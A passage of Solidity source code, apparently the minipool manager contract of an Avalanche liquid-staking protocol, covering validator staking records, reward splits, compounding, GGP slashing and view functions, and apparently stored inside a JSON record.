avaxLiquidStakerAmt);\n\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Launched));\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Launched);\n\n\t\tVault vault = Vault(getContractAddress(\"Vault\"));\n\t\tvault.withdrawAVAX(avaxNodeOpAmt);\n\n\t\tuint256 totalAvaxAmt = avaxNodeOpAmt + avaxLiquidStakerAmt;\n\t\tmsg.sender.safeTransferETH(totalAvaxAmt);\n\t}\n\n\t/// @notice Rialto calls this after successfully registering the minipool as a validator for Avalanche\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @param txID The ID of the transaction that successfully registered the node with Avalanche to become a validater\n\t/// @param startTime Time the node became a validator\n\tfunction recordStakingStart(\n\t\taddress nodeID,\n\t\tbytes32 txID,\n\t\tuint256 startTime\n\t) external {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Staking);\n\t\tif (startTime > block.timestamp) {\n\t\t\trevert InvalidStartTime();\n\t\t}\n\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Staking));\n\t\tsetBytes32(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".txID\")), txID);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".startTime\")), startTime);\n\n\t\t// If this is the first of many cycles, set the initialStartTime\n\t\tuint256 initialStartTime = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".initialStartTime\")));\n\t\tif (initialStartTime == 0) {\n\t\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".initialStartTime\")), startTime);\n\t\t}\n\n\t\taddress owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")));\n\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")));\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tif (staking.getAVAXAssignedHighWater(owner) < staking.getAVAXAssigned(owner)) {\n\t\t\tstaking.increaseAVAXAssignedHighWater(owner, avaxLiquidStakerAmt);\n\t\t}\n\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Staking);\n\t}\n\n\t/// @notice Records the nodeID's validation period end\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @param endTime The time the node ID stopped validating Avalanche\n\t/// @param avaxTotalRewardAmt The rewards the node recieved from Avalanche for being a validator\n\t/// @dev Rialto will xfer back all staked avax + avax rewards. Also handles the slashing of node ops GGP bond.\n\tfunction recordStakingEnd(\n\t\taddress nodeID,\n\t\tuint256 endTime,\n\t\tuint256 avaxTotalRewardAmt\n\t) external payable {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Withdrawable);\n\n\t\tuint256 startTime = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".startTime\")));\n\t\tif (endTime <= startTime || endTime > block.timestamp) {\n\t\t\trevert InvalidEndTime();\n\t\t}\n\n\t\tuint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")));\n\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")));\n\t\tuint256 totalAvaxAmt = avaxNodeOpAmt + avaxLiquidStakerAmt;\n\t\tif (msg.value != totalAvaxAmt + avaxTotalRewardAmt) {\n\t\t\trevert InvalidAmount();\n\t\t}\n\n\t\taddress owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")));\n\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Withdrawable));\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".endTime\")), endTime);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxTotalRewardAmt\")), avaxTotalRewardAmt);\n\n\t\t// Calculate rewards splits (these will all be zero if no rewards were recvd)\n\t\t// TODO Revisit this logic if we ever allow unequal matched funds\n\t\tuint256 avaxHalfRewards = avaxTotalRewardAmt / 2;\n\n\t\t// Node operators recv an additional commission fee\n\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));\n\t\tuint256 avaxLiquidStakerRewardAmt = avaxHalfRewards - avaxHalfRewards.mulWadDown(dao.getMinipoolNodeCommissionFeePct());\n\t\tuint256 avaxNodeOpRewardAmt = avaxTotalRewardAmt - avaxLiquidStakerRewardAmt;\n\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpRewardAmt\")), avaxNodeOpRewardAmt);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerRewardAmt\")), avaxLiquidStakerRewardAmt);\n\n\t\t// No rewards means validation period failed, must slash node ops GGP.\n\t\tif (avaxTotalRewardAmt == 0) {\n\t\t\tslash(minipoolIndex);\n\t\t}\n\n\t\t// Send the nodeOps AVAX + rewards to vault so they can claim later\n\t\tVault vault = Vault(getContractAddress(\"Vault\"));\n\t\tvault.depositAVAX{value: avaxNodeOpAmt + avaxNodeOpRewardAmt}();\n\t\t// Return Liq stakers funds + rewards\n\t\tggAVAX.depositFromStaking{value: avaxLiquidStakerAmt + avaxLiquidStakerRewardAmt}(avaxLiquidStakerAmt, avaxLiquidStakerRewardAmt);\n\t\tsubUint(keccak256(\"MinipoolManager.TotalAVAXLiquidStakerAmt\"), avaxLiquidStakerAmt);\n\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tstaking.decreaseAVAXAssigned(owner, avaxLiquidStakerAmt);\n\t\tstaking.decreaseMinipoolCount(owner);\n\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Withdrawable);\n\t}\n\n\t/// @notice Re-stake a minipool, compounding all rewards recvd\n\t/// @param nodeID 20-byte Avalanche node ID\n\tfunction recreateMinipool(address nodeID) external whenNotPaused {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);\n\t\tMinipool memory mp = getMinipool(minipoolIndex);\n\t\t// Compound the avax plus rewards\n\t\t// NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio\n\t\tuint256 compoundedAvaxNodeOpAmt = mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt;\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")), compoundedAvaxNodeOpAmt);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")), compoundedAvaxNodeOpAmt);\n\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\t// Only increase AVAX stake by rewards amount we are compounding\n\t\t// since AVAX stake is only decreased by withdrawMinipool()\n\t\tstaking.increaseAVAXStake(mp.owner, mp.avaxNodeOpRewardAmt);\n\t\tstaking.increaseAVAXAssigned(mp.owner, compoundedAvaxNodeOpAmt);\n\t\tstaking.increaseMinipoolCount(mp.owner);\n\n\t\tif (staking.getRewardsStartTime(mp.owner) == 0) {\n\t\t\t// Edge case where calculateAndDistributeRewards has reset their rewards time even though they are still cycling\n\t\t\t// So we re-set it here to their initial start time for this minipool\n\t\t\tstaking.setRewardsStartTime(mp.owner, mp.initialStartTime);\n\t\t}\n\n\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));\n\t\tuint256 ratio = staking.getCollateralizationRatio(mp.owner);\n\t\tif (ratio < dao.getMinCollateralizationRatio()) {\n\t\t\trevert InsufficientGGPCollateralization();\n\t\t}\n\n\t\tresetMinipoolData(minipoolIndex);\n\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Prelaunch));\n\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);\n\t}\n\n\t/// @notice A staking error occured while registering the node as a validator\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @param errorCode The code that represents the reason for failure\n\t/// @dev Rialto was unable to start the validation period, so cancel and refund all money\n\tfunction recordStakingError(address nodeID, bytes32 errorCode) external payable {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Error);\n\n\t\taddress owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".owner\")));\n\t\tuint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpAmt\")));\n\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerAmt\")));\n\n\t\tif (msg.value != (avaxNodeOpAmt + avaxLiquidStakerAmt)) {\n\t\t\trevert InvalidAmount();\n\t\t}\n\n\t\tsetBytes32(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".errorCode\")), errorCode);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Error));\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxTotalRewardAmt\")), 0);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxNodeOpRewardAmt\")), 0);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".avaxLiquidStakerRewardAmt\")), 0);\n\n\t\t// Send the nodeOps AVAX to vault so they can claim later\n\t\tVault vault = Vault(getContractAddress(\"Vault\"));\n\t\tvault.depositAVAX{value: avaxNodeOpAmt}();\n\n\t\t// Return Liq stakers funds\n\t\tggAVAX.depositFromStaking{value: avaxLiquidStakerAmt}(avaxLiquidStakerAmt, 0);\n\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tstaking.decreaseAVAXAssigned(owner, avaxLiquidStakerAmt);\n\n\t\tsubUint(keccak256(\"MinipoolManager.TotalAVAXLiquidStakerAmt\"), avaxLiquidStakerAmt);\n\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Error);\n\t}\n\n\t/// @notice Multisig can cancel a minipool if a problem was encountered *before* claimAndInitiateStaking() was called\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @param errorCode The code that represents the reason for failure\n\tfunction cancelMinipoolByMultisig(address nodeID, bytes32 errorCode) external {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\tsetBytes32(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".errorCode\")), errorCode);\n\t\t_cancelMinipoolAndReturnFunds(nodeID, minipoolIndex);\n\t}\n\n\t/// @notice Multisig can move a minipool from the error state to the finished state, after a human review of the error\n\t/// @param nodeID 20-byte Avalanche node ID\n\tfunction finishFailedMinipoolByMultisig(address nodeID) external {\n\t\tint256 minipoolIndex = onlyValidMultisig(nodeID);\n\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Finished);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", minipoolIndex, \".status\")), uint256(MinipoolStatus.Finished));\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Finished);\n\t}\n\n\t//\n\t// VIEW FUNCTIONS\n\t//\n\n\t/// @notice Get the total amount of AVAX from liquid stakers that is being used for minipools\n\t/// @dev Get the total AVAX *actually* withdrawn from ggAVAX and sent to Rialto\n\tfunction getTotalAVAXLiquidStakerAmt() public view returns (uint256) {\n\t\treturn getUint(keccak256(\"MinipoolManager.TotalAVAXLiquidStakerAmt\"));\n\t}\n\n\t/// @notice Calculates how much GGP should be slashed given an expected avaxRewardAmt\n\t/// @param avaxRewardAmt The amount of AVAX that should have been awarded to the validator by Avalanche\n\tfunction calculateGGPSlashAmt(uint256 avaxRewardAmt) public view returns (uint256) {\n\t\tOracle oracle = Oracle(getContractAddress(\"Oracle\"));\n\t\t(uint256 ggpPriceInAvax, ) = oracle.getGGPPriceInAVAX();\n\t\treturn avaxRewardAmt.divWadDown(ggpPriceInAvax);\n\t}\n\n\t/// @notice Given a duration and an AVAX amt, calculate how much AVAX should be earned via validation rewards\n\t/// @param duration The length of validation in seconds\n\t/// @param avaxAmt The amount of AVAX the node staked for their validation period\n\t/// @return The approximate rewards the node should recieve from Avalanche for beign a validator\n\tfunction getExpectedAVAXRewardsAmt(uint256 duration, uint256 avaxAmt) public view returns (uint256) {\n\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(\"ProtocolDAO\"));\n\t\tuint256 rate = dao.getExpectedAVAXRewardsRate();\n\t\treturn (avaxAmt.mulWadDown(rate) * duration) / 365 days;\n\t}\n\n\t/// @notice The index of a minipool. Returns -1 if the minipool is not found\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @return The index for the given minipool\n\tfunction getIndexOf(address nodeID) public view returns (int256) {\n\t\treturn int256(getUint(keccak256(abi.encodePacked(\"minipool.index\", nodeID)))) - 1;\n\t}\n\n\t/// @notice Gets the minipool information from the node ID\n\t/// @param nodeID 20-byte Avalanche node ID\n\tfunction getMinipoolByNodeID(address nodeID) public view returns (Minipool memory mp) {\n\t\tint256 index = getIndexOf(nodeID);\n\t\treturn getMinipool(index);\n\t}\n\n\t/// @notice Gets the minipool information using the minipool's index\n\t/// @param index Index of the minipool\n\t/// @return mp struct containing the minipool's properties\n\tfunction getMinipool(int256 index) public view returns (Minipool memory mp) {\n\t\tmp.index = index;\n\t\tmp.nodeID = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".nodeID\")));\n\t\tmp.status = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".status\")));\n\t\tmp.duration = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".duration\")));\n\t\tmp.delegationFee = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".delegationFee\")));\n\t\tmp.owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".owner\")));\n\t\tmp.multisigAddr = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".multisigAddr\")));\n\t\tmp.avaxNodeOpAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxNodeOpAmt\")));\n\t\tmp.avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxLiquidStakerAmt\")));\n\t\tmp.txID = getBytes32(keccak256(abi.encodePacked(\"minipool.item\", index, \".txID\")));\n\t\tmp.initialStartTime = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".initialStartTime\")));\n\t\tmp.startTime = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".startTime\")));\n\t\tmp.endTime = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".endTime\")));\n\t\tmp.avaxTotalRewardAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxTotalRewardAmt\")));\n\t\tmp.errorCode = getBytes32(keccak256(abi.encodePacked(\"minipool.item\", index, \".errorCode\")));\n\t\tmp.avaxNodeOpInitialAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxNodeOpInitialAmt\")));\n\t\tmp.avaxNodeOpRewardAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxNodeOpRewardAmt\")));\n\t\tmp.avaxLiquidStakerRewardAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxLiquidStakerRewardAmt\")));\n\t\tmp.ggpSlashAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".ggpSlashAmt\")));\n\t}\n\n\t/// @notice Get minipools in a certain status (limit=0 means no pagination)\n\t/// @param status The MinipoolStatus to be used as a filter\n\t/// @param offset The number the result should be offset by\n\t/// @param limit The limit to the amount of minipools that should be returned\n\t/// @return minipools in the protocol that adhear to the paramaters\n\tfunction getMinipools(\n\t\tMinipoolStatus status,\n\t\tuint256 offset,\n\t\tuint256 limit\n\t) public view returns (Minipool[] memory minipools) {\n\t\tuint256 totalMinipools = getUint(keccak256(\"minipool.count\"));\n\t\tuint256 max = offset + limit;\n\t\tif (max > totalMinipools || limit == 0) {\n\t\t\tmax = totalMinipools;\n\t\t}\n\t\tminipools = new Minipool[](max - offset);\n\t\tuint256 total = 0;\n\t\tfor (uint256 i = offset; i < max; i++) {\n\t\t\tMinipool memory mp = getMinipool(int256(i));\n\t\t\tif (mp.status == uint256(status)) {\n\t\t\t\tminipools[total] = mp;\n\t\t\t\ttotal++;\n\t\t\t}\n\t\t}\n\t\t// Dirty hack to cut unused elements off end of return value (from RP)\n\t\t// solhint-disable-next-line no-inline-assembly\n\t\tassembly {\n\t\t\tmstore(minipools, total)\n\t\t}\n\t}\n\n\t/// @notice The total count of minipools in the protocol\n\tfunction getMinipoolCount() public view returns (uint256) {\n\t\treturn getUint(keccak256(\"minipool.count\"));\n\t}\n\n\t//\n\t// PRIVATE FUNCTIONS\n\t//\n\n\t/// @notice Cancels the minipool and returns the funds related to it\n\t/// @dev At this point we dont have any liq staker funds withdrawn from ggAVAX so no need to return them\n\t/// @param nodeID 20-byte Avalanche node ID\n\t/// @param index Index of the minipool\n\tfunction _cancelMinipoolAndReturnFunds(address nodeID, int256 index) private {\n\t\trequireValidStateTransition(index, MinipoolStatus.Canceled);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".status\")), uint256(MinipoolStatus.Canceled));\n\n\t\taddress owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".owner\")));\n\t\tuint256 avaxNodeOpAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxNodeOpAmt\")));\n\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxLiquidStakerAmt\")));\n\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tstaking.decreaseAVAXStake(owner, avaxNodeOpAmt);\n\t\tstaking.decreaseAVAXAssigned(owner, avaxLiquidStakerAmt);\n\n\t\tstaking.decreaseMinipoolCount(owner);\n\n\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Canceled);\n\n\t\tVault vault = Vault(getContractAddress(\"Vault\"));\n\t\tvault.withdrawAVAX(avaxNodeOpAmt);\n\t\towner.safeTransferETH(avaxNodeOpAmt);\n\t}\n\n\t/// @notice Slashes the GPP of the minipool with the given index\n\t/// @dev Extracted this because of \"stack too deep\" errors.\n\t/// @param index Index of the minipool\n\tfunction slash(int256 index) private {\n\t\taddress nodeID = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".nodeID\")));\n\t\taddress owner = getAddress(keccak256(abi.encodePacked(\"minipool.item\", index, \".owner\")));\n\t\tuint256 duration = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".duration\")));\n\t\tuint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".avaxLiquidStakerAmt\")));\n\t\tuint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);\n\t\tuint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);\n\t\tsetUint(keccak256(abi.encodePacked(\"minipool.item\", index, \".ggpSlashAmt\")), slashGGPAmt);\n\n\t\temit GGPSlashed(nodeID, slashGGPAmt);\n\n\t\tStaking staking = Staking(getContractAddress(\"Staking\"));\n\t\tstaking.slashGGP(owner, slashGGPAmt);\n\t}\n\n\t/// @notice Reset all the data for a given minipool (for a previous validation cycle, so do not reset initial"
    }
  ]
}